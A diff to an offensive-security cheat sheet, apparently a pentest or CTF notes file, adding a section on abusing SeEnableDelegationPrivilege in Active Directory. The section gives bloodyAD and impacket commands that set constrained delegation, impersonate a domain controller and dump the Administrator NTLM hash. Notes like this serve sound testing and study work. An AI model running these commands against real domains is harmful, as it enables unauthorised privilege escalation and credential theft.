@@ -35,6 +35,7 @@
 - <<privesc, Privilage Escalation>>
   * <<backup, SeBackupPrivilege>>
   * <<dpapi,  DPAPI secrets>>
+  * <<delegation, SeEnableDelegationPrivilege>>
 
 [[overview]]
 == Overview
@@ -956,6 +957,48 @@ Returns a long `MD4` key
 
 ```bash
 impacket-dpapi credential -file "/path/to/file/locally/master2" -key '0xd9a570722fbaf7149f9f<SNIP>9e9c84'
+```
+
+[[delegation]]
+=== SeEnableDelegationPrivilege
+
+Enable *Kerberos delegation* for an account or computer in AD
+
+Scenario: low-priv user has a `SeEnableDelegationPrivilege` in remote access and has a `GenericAll` privilege over anouther computer in AD
+
+Main goal: extract NTLM hash of `Administrator`
+
+1.Configure password of computer
+
+2.Also can be used tool `impacket-findDelegation` to enemurate delegations , user must have a `SeEnableDelegationPrivilege`!
+
+```bash
+impacket-findDelegation   "domain"/"user":"password"
+```
+
+3.Enable *Kerberos delegation* type: *S4U*, Computer is trusted for auth of anouther users
+
+```bash
+bloodyAD --host dc.host -d domain -u 'user' -p 'password' add uac 'computer' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+```
+
+4.For what servises account have a privilege of *Kerberos delegation*, modify `msDS-AllowedToDelegateTo` attibute
+
+```bash
+bloodyAD --host dc.host -d domain  -u 'user' -p 'password' set object 'computer' msDS-
+AllowedToDelegateTo -v 'smb/dc.target'
+```
+
+5.get kerberos ticket(optional)
+
+```bash
+impacket-getST domain/'computer':'password' -spn 'smb/dc.target' -impersonate dc
+```
+
+5.Extract NTLM hash of user
+
+```bash
+impacket-secretsdump -k dc.target  
 ```
 
 
